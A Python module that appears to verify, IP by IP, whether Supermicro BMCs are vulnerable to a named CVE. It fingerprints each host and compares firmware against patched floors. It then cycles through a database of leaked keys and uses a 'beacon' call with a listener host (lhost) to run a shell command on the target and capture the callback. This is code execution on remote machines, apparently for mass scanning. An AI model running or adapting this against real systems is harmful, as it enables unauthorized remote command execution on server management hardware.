"""
Per-IP CVE-2024-36435 determination.
Uses smc36435_bridge for fingerprinting + key DB. Returns:
  ('confirmed', detail)  — firmware below floor OR key MAC-accepted
  ('possible',  detail)  — responds as Supermicro BMC but version unknown / no key worked
  ('not_bmc',   detail)  — not a Supermicro BMC
  ('unreachable', detail)
"""
import re, logging
from smc36435_bridge import BMC, KeyDB, FIXED

log = logging.getLogger("verify")
LOGIN = "/Login.aspx"


def _family(fw):
    m = re.match(r"([a-z0-9]+)[_\-]", fw.lower()) if fw else None
    return m.group(1) if m else ""


def _below_floor(fw):
    m = re.match(r"([a-z0-9]+)[_\-](\d+)\.(\d+)", fw.lower()) if fw else None
    if not m: return None
    floor = FIXED.get(m.group(1))
    if not floor: return None
    return (int(m.group(2)), int(m.group(3))) < floor


def verify(ip, key_db_path, timeout=8, beacon_wait=4, lhost=None):
    b = BMC(ip, lhost=lhost, ysoserial=None, verbose=False)
    try:
        b.s.get  # touch
    except Exception:
        pass
    # 1) fingerprint
    try:
        hits = b.fingerprint()
    except Exception as e:
        return ("unreachable", f"{type(e).__name__}")
    if not hits:
        return ("not_bmc", "no Supermicro/ASP.NET markers")
    fw = b.meta.get("firmware", "")
    fam = b.meta.get("family", "") or _family(fw)

    # 2) firmware floor check
    below = _below_floor(fw)
    if below is True:
        return ("confirmed", f"firmware {fw} below {FIXED.get(fam)} floor")
    if below is False:
        return ("possible", f"firmware {fw} at/above floor — patched unless key works")

    # 3) key probe (MAC-accepted = vuln path exists)
    if not lhost:
        return ("possible", f"fingerprint ok, fw={fw or 'unknown'}, no lhost for key probe")
    db = KeyDB(key_db_path)
    cands = db.for_family(fam) or db.all()
    if not cands:
        return ("possible", f"fingerprint ok, fw={fw or 'unknown'}, no key candidates")
    for c in cands:
        b.keys = c
        try:
            out = b.beacon('echo SMC36435-OK-$(id -u)', timeout=beacon_wait)
        except Exception:
            out = None
        if out and "SMC36435-OK" in out:
            return ("confirmed", f"key {c['src']} MAC-accepted, uid={out.rsplit('-',1)[-1].strip()}")
    return ("possible", f"fingerprint ok, fw={fw or 'unknown'}, no key produced callback")
